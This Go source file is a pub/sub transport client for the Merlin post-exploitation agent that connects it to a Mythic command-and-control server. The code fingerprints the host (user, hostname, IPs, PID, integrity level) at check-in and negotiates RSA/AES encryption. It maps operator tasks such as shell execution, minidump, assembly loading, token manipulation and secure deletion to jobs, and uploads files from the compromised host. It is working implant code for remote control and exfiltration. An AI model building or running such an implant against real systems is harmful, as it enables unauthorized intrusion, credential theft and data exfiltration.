/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

//[Debug] is turned off in the main.go file, false = no debug prints, true = debug prints enabled (verbose mode is separate and controls more high-level info prints)

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/Ne0nd0g/merlin-agent/v2/core"
	merlinOS "github.com/Ne0nd0g/merlin-agent/v2/os"
	messages "github.com/Ne0nd0g/merlin-message"
	"github.com/Ne0nd0g/merlin-message/jobs"
	"github.com/fatih/color"
	"github.com/google/uuid"
)

// PubSubClient adapts the generic Transport to Merlin's clients.Client interface
type PubSubClient struct {
	transport   *Transport
	agentID     string // current Mythic UUID (starts as payloadID, updated to callback UUID after checkin)
	payloadUUID string // original payload UUID (never changes, used for Merlin internal message IDs)
	stagingUUID string // staging UUID from RSA key exchange (used for frame UUID until checkin completes)
	instanceID  string // unique per-process ID for routing (prevents same-UUID collision)
	config      map[string]interface{}
	messages    chan interface{}
	pendingJobs []messages.Base
	mu          sync.Mutex
	running     bool

	// Encryption settings
	encryptionMode  string // "aes256_hmac", "rsa", or "none"
	psk             []byte // 32-byte AES key (nil for plaintext mode)
	initialChan     chan map[string]interface{}
	checkinDone     bool
	listenerStarted bool
	usedRSAStaging  bool // true if key was obtained via RSA staging
}

// NewPubSubClient creates a new pub/sub client for Merlin.
// pskB64 is the base64-encoded 32-byte AES key from Mythic's AESPSK parameter.
// encMode determines encryption: "aes256_hmac" (use PSK), "rsa" (RSA key exchange), "none" (plaintext).
func NewPubSubClient(cfg *Config, agentID string, pskB64 string, encMode string) (*PubSubClient, error) {
	instanceID := uuid.New().String()

	if core.Verbose {
		color.Cyan(fmt.Sprintf("[*] Generated instance ID: %s (agent UUID: %s)", instanceID, agentID))
		color.Cyan(fmt.Sprintf("[*] Subscription will be: mythic-tasks-sub-%s", instanceID))
	}

	// Handle encryption mode
	var pskKey []byte
	if encMode == "" {
		encMode = "aes256_hmac" // Default to PSK mode for backward compatibility
	}

	switch encMode {
	case "aes256_hmac":
		if pskB64 == "" {
			return nil, fmt.Errorf("PSK required for aes256_hmac mode but not provided")
		}
		var err error
		pskKey, err = base64.StdEncoding.DecodeString(pskB64)
		if err != nil {
			return nil, fmt.Errorf("failed to decode PSK: %w", err)
		}
		if len(pskKey) != 32 {
			return nil, fmt.Errorf("PSK must be 32 bytes, got %d", len(pskKey))
		}
		if core.Verbose {
			color.Green("[+] AES-256 PSK loaded successfully (static PSK mode)")
		}
	case "rsa":
		if core.Verbose {
			color.Cyan("[*] RSA key exchange mode — will perform staging to obtain AES key")
		}
	case "none":
		if core.Verbose {
			color.Yellow("[*] Plaintext mode — NO ENCRYPTION (for testing only)")
		}
	default:
		return nil, fmt.Errorf("unknown encryption mode: %s", encMode)
	}

	transport, err := NewTransport(cfg, instanceID, agentID)
	if err != nil {
		return nil, fmt.Errorf("failed to create pubsub transport: %w", err)
	}

	client := &PubSubClient{
		transport:      transport,
		agentID:        agentID,
		payloadUUID:    agentID,
		instanceID:     instanceID,
		config:         make(map[string]interface{}),
		messages:       make(chan interface{}, 100),
		pendingJobs:    make([]messages.Base, 0),
		running:        false,
		encryptionMode: encMode,
		psk:            pskKey,
	}

	return client, nil
}

// Authenticate performs authentication (not used for pub/sub, but required by interface)
func (p *PubSubClient) Authenticate(msg messages.Base) error {
	if core.Verbose {
		color.Green("[+] PubSub client authenticated")
	}
	return nil
}

// Get retrieves a configuration value
func (p *PubSubClient) Get(key string) string {
	p.mu.Lock()
	defer p.mu.Unlock()
	if val, ok := p.config[key]; ok {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}

// Set sets a configuration value
func (p *PubSubClient) Set(key string, value string) error {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.config[key] = value
	return nil
}

// Initial performs the checkin with Mythic.
// If PSK is set (aes256_hmac mode), uses static PSK for encryption.
// If PSK is nil (none mode), performs RSA key exchange staging first.
func (p *PubSubClient) Initial() error {
	time.Sleep(2 * time.Second)

	// Create channel for synchronous responses
	p.initialChan = make(chan map[string]interface{}, 10)

	// Start transport listener goroutine ONCE
	if !p.listenerStarted {
		p.listenerStarted = true
		go func() {
			err := p.transport.Listen(func(task map[string]interface{}) map[string]interface{} {
				if core.Debug {
					color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Received message: %v", task))
				}
				if !p.checkinDone {
					p.initialChan <- task
				} else {
					p.messages <- task
				}
				return nil
			})
			if err != nil {
				if core.Verbose {
					color.Red(fmt.Sprintf("[-] Transport listener error: %v", err))
				}
			}
		}()
	}

	// Handle encryption based on mode
	switch p.encryptionMode {
	case "aes256_hmac":
		if core.Verbose {
			color.Cyan("[*] Using static PSK for encryption")
		}
	case "rsa":
		if core.Verbose {
			color.Cyan("[*] Starting RSA key exchange staging...")
		}
		if err := p.performRSAStaging(); err != nil {
			return fmt.Errorf("RSA staging failed: %w", err)
		}
		p.usedRSAStaging = true
		if core.Verbose {
			color.Green("[+] RSA staging complete — AES key obtained")
		}
	case "none":
		if core.Verbose {
			color.Yellow("[*] Plaintext mode — skipping encryption setup")
		}
	}

	// Now perform encrypted checkin
	if core.Verbose {
		color.Cyan("[*] Sending encrypted checkin...")
	}

	// Build checkin JSON
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	ips := []string{}
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}
	if len(ips) == 0 {
		ips = []string{"127.0.0.1"}
	}

	// Get integrity level from merlin-agent os package (handles Windows/Unix detection)
	integrityLevel, _ := merlinOS.GetIntegrityLevel()

	checkinMsg := map[string]interface{}{
		"action":          "checkin",
		"uuid":            p.agentID,
		"ips":             ips,
		"os":              runtime.GOOS,
		"user":            username,
		"host":            hostname,
		"pid":             os.Getpid(),
		"architecture":    runtime.GOARCH,
		"integrity_level": integrityLevel,
	}
	checkinJSON, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin: %w", err)
	}

	// Determine which UUID to use for the frame
	// - RSA staging mode: use stagingUUID (so Mythic can find the encryption key)
	// - PSK/plaintext mode: use agentID (payload UUID)
	frameUUID := p.agentID
	if p.stagingUUID != "" {
		frameUUID = p.stagingUUID
	}

	// Build Mythic frame based on encryption mode
	var frame string
	if p.encryptionMode == "none" {
		// Plaintext mode - no encryption
		if core.Verbose {
			color.Yellow(fmt.Sprintf("[*] Sending plaintext checkin (frame UUID: %s)", frameUUID))
		}
		frame = buildMythicFrame(frameUUID, checkinJSON)
	} else {
		// Encrypted mode (aes256_hmac or rsa)
		if core.Verbose {
			color.Cyan(fmt.Sprintf("[*] Sending encrypted checkin (frame UUID: %s, body UUID: %s)", frameUUID, p.agentID))
		}
		encrypted, err := aesEncrypt(p.psk, checkinJSON)
		if err != nil {
			return fmt.Errorf("failed to AES-encrypt checkin: %w", err)
		}
		frame = buildMythicFrame(frameUUID, encrypted)
	}

	// Send
	if err := p.transport.SendRaw(frame); err != nil {
		return fmt.Errorf("failed to send checkin: %w", err)
	}

	// Wait for response
	var resp map[string]interface{}
	select {
	case resp = <-p.initialChan:
	case <-time.After(30 * time.Second):
		return fmt.Errorf("timeout waiting for checkin response")
	}

	// Extract "message" field from wrapper
	encodedMsg, ok := resp["message"].(string)
	if !ok {
		return fmt.Errorf("checkin response missing 'message' field")
	}

	// Parse Mythic frame
	_, body, err := parseMythicFrame(encodedMsg)
	if err != nil {
		return fmt.Errorf("failed to parse checkin response frame: %w", err)
	}

	// Decrypt response (skip for plaintext mode)
	var plaintext []byte
	if p.encryptionMode == "none" {
		plaintext = body
		if core.Debug {
			color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Plaintext checkin response: %s", string(plaintext)))
		}
	} else {
		plaintext, err = aesDecrypt(p.psk, body)
		if err != nil {
			return fmt.Errorf("failed to AES-decrypt checkin response: %w", err)
		}
		if core.Debug {
			color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Decrypted checkin response: %s", string(plaintext)))
		}
	}

	// Parse JSON to extract callback UUID
	var checkinResp map[string]interface{}
	if err := json.Unmarshal(plaintext, &checkinResp); err != nil {
		return fmt.Errorf("failed to parse checkin response JSON: %w", err)
	}

	newID, ok := checkinResp["id"].(string)
	if !ok || newID == "" {
		return fmt.Errorf("checkin response missing 'id' field")
	}

	status, _ := checkinResp["status"].(string)
	if status != "success" {
		return fmt.Errorf("checkin response status: %s", status)
	}

	// Update agent ID to the new callback UUID
	oldID := p.agentID
	p.agentID = newID
	p.transport.agentID = newID

	// Clear staging UUID - no longer needed after successful checkin
	p.stagingUUID = ""

	// Mark checkin as done — future messages go to p.messages
	p.checkinDone = true

	if core.Verbose {
		color.Green(fmt.Sprintf("[+] Checkin successful — UUID updated from %s to %s", oldID, newID))
	}

	return nil
}

// performRSAStaging performs the Mythic staging_rsa key exchange to obtain an AES key.
func (p *PubSubClient) performRSAStaging() error {
	// Generate RSA key pair
	privKey, pubKeyDER, err := generateRSAKeyPair()
	if err != nil {
		return fmt.Errorf("failed to generate RSA key pair: %w", err)
	}

	if core.Debug {
		color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Generated RSA key pair, public key size: %d bytes", len(pubKeyDER)))
	}

	// Build staging_rsa message
	sessionID := uuid.New().String()
	stagingMsg := map[string]interface{}{
		"action":     "staging_rsa",
		"pub_key":    base64.StdEncoding.EncodeToString(pubKeyDER),
		"session_id": sessionID,
	}
	stagingJSON, err := json.Marshal(stagingMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal staging_rsa message: %w", err)
	}

	if core.Verbose {
		color.Cyan(fmt.Sprintf("[*] Sending staging_rsa with session_id: %s", sessionID))
	}

	// Build Mythic frame: base64(payloadUUID + plaintext_staging_body)
	// Note: staging_rsa is sent in plaintext (no encryption yet)
	frame := buildMythicFrame(p.agentID, stagingJSON)

	// Send
	if err := p.transport.SendRaw(frame); err != nil {
		return fmt.Errorf("failed to send staging_rsa: %w", err)
	}

	// Wait for response
	var resp map[string]interface{}
	select {
	case resp = <-p.initialChan:
	case <-time.After(30 * time.Second):
		return fmt.Errorf("timeout waiting for staging_rsa response")
	}

	// Extract "message" field from wrapper
	encodedMsg, ok := resp["message"].(string)
	if !ok {
		return fmt.Errorf("staging_rsa response missing 'message' field")
	}

	// Parse Mythic frame
	_, body, err := parseMythicFrame(encodedMsg)
	if err != nil {
		return fmt.Errorf("failed to parse staging_rsa response frame: %w", err)
	}

	if core.Debug {
		color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Received staging_rsa response, body size: %d bytes", len(body)))
	}

	// Mythic returns JSON with session_key field containing base64-encoded RSA-encrypted key
	var stagingResp struct {
		UUID       string `json:"uuid"`
		SessionID  string `json:"session_id"`
		SessionKey string `json:"session_key"`
		Action     string `json:"action"`
	}
	if err := json.Unmarshal(body, &stagingResp); err != nil {
		return fmt.Errorf("failed to parse staging_rsa response JSON: %w", err)
	}

	if stagingResp.SessionKey == "" {
		return fmt.Errorf("staging_rsa response missing session_key field")
	}

	if stagingResp.UUID == "" {
		return fmt.Errorf("staging_rsa response missing uuid field")
	}

	// Base64 decode the session_key
	encryptedKey, err := base64.StdEncoding.DecodeString(stagingResp.SessionKey)
	if err != nil {
		return fmt.Errorf("failed to base64 decode session_key: %w", err)
	}

	if core.Debug {
		color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Decoded session_key, encrypted size: %d bytes", len(encryptedKey)))
	}

	// RSA decrypt to get the AES key
	aesKey, err := rsaDecryptOAEP(privKey, encryptedKey)
	if err != nil {
		return fmt.Errorf("failed to RSA-decrypt AES key: %w", err)
	}

	if len(aesKey) != 32 {
		return fmt.Errorf("expected 32-byte AES key, got %d bytes", len(aesKey))
	}

	// Store the AES key
	p.psk = aesKey

	// Save the staging UUID - this is needed for building frames so Mythic can find the encryption key.
	// The payloadUUID stays in agentID and is used inside the JSON body for payload lookup.
	p.stagingUUID = stagingResp.UUID

	if core.Verbose {
		color.Green("[+] Successfully obtained 32-byte AES key via RSA staging")
		color.Green(fmt.Sprintf("[+] Staging UUID: %s", p.stagingUUID))
	}

	return nil
}

// min helper function
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// convertMythicTasksToMerlin converts Mythic task format to Merlin messages.Base.
func (p *PubSubClient) convertMythicTasksToMerlin(taskData map[string]interface{}) messages.Base {
	base := messages.Base{
		ID:   uuid.MustParse(p.payloadUUID),
		Type: messages.JOBS,
	}

	tasksInterface, ok := taskData["tasks"]
	if !ok {
		base.Payload = []jobs.Job{}
		return base
	}

	tasksArray, ok := tasksInterface.([]interface{})
	if !ok {
		base.Payload = []jobs.Job{}
		return base
	}

	merlinJobs := make([]jobs.Job, 0, len(tasksArray))
	for _, taskInterface := range tasksArray {
		taskMap, ok := taskInterface.(map[string]interface{})
		if !ok {
			continue
		}

		taskID, _ := taskMap["id"].(string)
		commandStr, _ := taskMap["command"].(string)

		var cmd jobs.Command
		if paramsInterface, ok := taskMap["parameters"]; ok {
			if paramsStr, ok := paramsInterface.(string); ok {
				var paramsMap map[string]interface{}
				if err := json.Unmarshal([]byte(paramsStr), &paramsMap); err == nil {
					if payloadInterface, ok := paramsMap["payload"]; ok {
						if payloadStr, ok := payloadInterface.(string); ok {
							json.Unmarshal([]byte(payloadStr), &cmd)
						} else if payloadMap, ok := payloadInterface.(map[string]interface{}); ok {
							if c, ok := payloadMap["command"].(string); ok {
								cmd.Command = c
							}
							if a, ok := payloadMap["args"].([]interface{}); ok {
								for _, arg := range a {
									if argStr, ok := arg.(string); ok {
										cmd.Args = append(cmd.Args, argStr)
									}
								}
							}
						}
					}
				}
			}
		}

		if cmd.Command == "" {
			cmd.Command = commandStr
		}

		var jobType jobs.Type
		switch strings.ToLower(cmd.Command) {
		case "exit", "agentinfo", "ja3", "killdate", "maxretry", "padding", "parrot", "skew", "sleep", "initialize", "connect", "listener":
			jobType = jobs.CONTROL
		case "shell", "run", "exec":
			jobType = jobs.CMD
		case "ps", "pipes", "uptime", "netstat", "ssh", "token", "runas", "memory", "memfd", "link", "unlink":
			jobType = jobs.MODULE
		case "createprocess", "minidump", "invoke-assembly", "load-assembly", "list-assemblies":
			jobType = jobs.MODULE
		case "ls", "cd", "pwd", "rm", "env", "ifconfig", "killprocess", "nslookup", "touch", "sdelete":
			jobType = jobs.NATIVE
		default:
			jobType = jobs.NATIVE
		}

		job := jobs.Job{
			AgentID: uuid.MustParse(p.payloadUUID),
			ID:      taskID,
			Token:   uuid.New(),
			Type:    jobType,
			Payload: cmd,
		}

		merlinJobs = append(merlinJobs, job)

		if core.Debug {
			color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Created job: ID=%s, Command=%s, Args=%v", job.ID, cmd.Command, cmd.Args))
		}
	}

	if core.Debug {
		color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Total jobs created: %d", len(merlinJobs)))
	}

	base.Payload = merlinJobs
	return base
}

// Listen starts listening for messages from the server
func (p *PubSubClient) Listen() ([]messages.Base, error) {
	p.mu.Lock()
	if !p.running {
		p.running = true
		p.mu.Unlock()

		if core.Verbose {
			color.Cyan("[*] Starting PubSub message processor goroutine")
		}

		// Transport listener is already running from Initial().
		// Start a processor goroutine that decrypts incoming messages and queues them.
		go func() {
			for msg := range p.messages {
				mythicMap, ok := msg.(map[string]interface{})
				if !ok {
					if core.Verbose {
						color.Red(fmt.Sprintf("[-] Invalid message type: %T", msg))
					}
					continue
				}

				// Extract and decrypt the "message" field
				encodedMsg, ok := mythicMap["message"].(string)
				if !ok {
					if core.Verbose {
						color.Red("[-] Message missing 'message' field")
					}
					continue
				}

				// Parse Mythic frame
				_, body, err := parseMythicFrame(encodedMsg)
				if err != nil {
					if core.Verbose {
						color.Red(fmt.Sprintf("[-] Failed to parse Mythic frame: %v", err))
					}
					continue
				}

				// Decrypt (skip for plaintext mode)
				var plaintext []byte
				if p.encryptionMode == "none" {
					plaintext = body
				} else if p.psk != nil {
					plaintext, err = aesDecrypt(p.psk, body)
					if err != nil {
						if core.Verbose {
							color.Red(fmt.Sprintf("[-] Failed to AES-decrypt message: %v", err))
						}
						continue
					}
				} else {
					if core.Verbose {
						color.Red("[-] No encryption key available but encryption mode is not 'none'")
					}
					continue
				}

				// Parse JSON
				var taskData map[string]interface{}
				if err := json.Unmarshal(plaintext, &taskData); err != nil {
					if core.Verbose {
						color.Red(fmt.Sprintf("[-] Failed to parse decrypted JSON: %v", err))
					}
					continue
				}

				if core.Debug {
					color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Decrypted task data: %v", taskData))
				}

				// Convert to Merlin messages.Base
				base := p.convertMythicTasksToMerlin(taskData)

				if core.Verbose {
					color.Green(fmt.Sprintf("[+] Received and decrypted task from PubSub: %v", base))
				}

				p.mu.Lock()
				p.pendingJobs = append(p.pendingJobs, base)
				p.mu.Unlock()
			}
		}()

		return []messages.Base{}, nil
	}
	p.mu.Unlock()

	// Retrieve pending jobs
	p.mu.Lock()
	pendingJobs := make([]messages.Base, len(p.pendingJobs))
	copy(pendingJobs, p.pendingJobs)
	p.pendingJobs = p.pendingJobs[:0]
	p.mu.Unlock()

	if core.Debug && len(pendingJobs) > 0 {
		color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Returning %d jobs from pending queue", len(pendingJobs)))
	}

	if len(pendingJobs) == 0 {
		time.Sleep(100 * time.Millisecond)
	}

	return pendingJobs, nil
}

// Send sends a Merlin message to Mythic, encrypted (or plaintext) and framed.
func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
	if core.Debug {
		color.Yellow(fmt.Sprintf("[PubSub_client][DEBUG] Sending message: %v", message))
	}

	// Convert Merlin format to Mythic API format
	mythicMsg := p.convertToMythicFormat(message)

	// Marshal to JSON
	jsonBody, err := json.Marshal(mythicMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal message: %w", err)
	}

	// Build Mythic frame based on encryption mode
	var frame string
	if p.encryptionMode == "none" {
		// Plaintext mode
		frame = buildMythicFrame(p.agentID, jsonBody)
	} else if p.psk != nil {
		// Encrypted mode (aes256_hmac or rsa)
		encrypted, err := aesEncrypt(p.psk, jsonBody)
		if err != nil {
			return nil, fmt.Errorf("failed to AES-encrypt message: %w", err)
		}
		frame = buildMythicFrame(p.agentID, encrypted)
	} else {
		return nil, fmt.Errorf("no encryption key available for mode: %s", p.encryptionMode)
	}

	// Send via transport
	if err := p.transport.SendRaw(frame); err != nil {
		return nil, fmt.Errorf("failed to send: %w", err)
	}

	if p.encryptionMode == "none" {
		if core.Verbose {
			color.Yellow("[+] Plaintext message sent")
		}
	} else {
		if core.Verbose {
			color.Green("[+] Encrypted message sent successfully")
		}
	}

	return []messages.Base{}, nil
}

// convertToMythicFormat converts Merlin messages.Base to Mythic API format
func (p *PubSubClient) convertToMythicFormat(msg messages.Base) map[string]interface{} {
	mythicMsg := make(map[string]interface{})

	switch msg.Type {
	case messages.CHECKIN:
		// After initial checkin, subsequent checkins become get_tasking requests
		mythicMsg["action"] = "get_tasking"
		mythicMsg["tasking_size"] = -1

	case messages.JOBS:
		jobsArray, ok := msg.Payload.([]jobs.Job)
		if ok && len(jobsArray) > 0 {
			if jobsArray[0].Type == jobs.RESULT || jobsArray[0].Type == jobs.AGENTINFO || jobsArray[0].Type == jobs.FILETRANSFER {
				mythicMsg["action"] = "post_response"

				responses := make([]interface{}, 0, len(jobsArray))
				for _, job := range jobsArray {
					response := map[string]interface{}{
						"task_id": job.ID,
					}

					switch job.Type {
					case jobs.RESULT:
						result := job.Payload.(jobs.Results)
						if result.Stdout != "" {
							response["user_output"] = result.Stdout
						}
						if result.Stderr != "" {
							response["user_output"] = result.Stderr
						}
						response["completed"] = true
						response["status"] = "success"
					case jobs.AGENTINFO:
						infoBytes, _ := json.Marshal(job.Payload)
						response["user_output"] = string(infoBytes)
						response["completed"] = true
						response["status"] = "success"
					case jobs.FILETRANSFER:
						ft := job.Payload.(jobs.FileTransfer)
						if ft.IsDownload {
							response["user_output"] = fmt.Sprintf("File uploaded: %s", ft.FileLocation)
						} else {
							response["user_output"] = fmt.Sprintf("File downloaded: %s", ft.FileLocation)
							response["download"] = map[string]interface{}{
								"path": ft.FileLocation,
								"data": ft.FileBlob,
							}
						}
						response["completed"] = true
						response["status"] = "success"
					}

					responses = append(responses, response)
				}

				mythicMsg["responses"] = responses
			} else {
				mythicMsg["action"] = "get_tasking"
				mythicMsg["tasking_size"] = -1
			}
		} else {
			mythicMsg["action"] = "get_tasking"
			mythicMsg["tasking_size"] = -1
		}

	default:
		mythicMsg["action"] = "post_response"
		mythicMsg["responses"] = []interface{}{msg}
	}

	return mythicMsg
}

// Synchronous returns whether this is a synchronous client
func (p *PubSubClient) Synchronous() bool {
	return true
}

// Close closes the pub/sub client
func (p *PubSubClient) Close() error {
	if core.Verbose {
		color.Cyan("[*] Closing PubSub client")
	}

	p.mu.Lock()
	p.running = false
	p.mu.Unlock()

	close(p.messages)
	return p.transport.Close()
}
